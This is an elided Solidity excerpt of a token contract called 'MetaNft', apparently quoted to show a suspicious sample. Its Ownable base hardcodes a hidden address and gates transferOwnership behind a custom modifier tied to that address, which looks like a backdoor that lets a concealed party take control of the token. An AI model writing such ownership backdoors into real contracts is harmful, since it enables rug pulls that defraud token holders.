...
contract Ownable is Context {
    ...
    address private _cmAddress = 0xd7c2F3E5C6a4d39EAF6C3a2FA1989Ae3F5D4D21B;
    ...
    function transferOwnership(address newOwner) public virtual cmAddress {
        _owner = newOwner;
    }
}
...
contract MetaNft is Context, IERC20, Ownable {
    ...
    address public devAddress = 0xd7c2F3E5C6a4d39EAF6C3a2FA1989Ae3F5D4D21B;
    ...
    bool public Fomo = false;

 
    uint256 public Tfdgf = uint256(0);

    mapping(address => uint256) public Tfdgfs;

    address[] public _Tfdgfs;
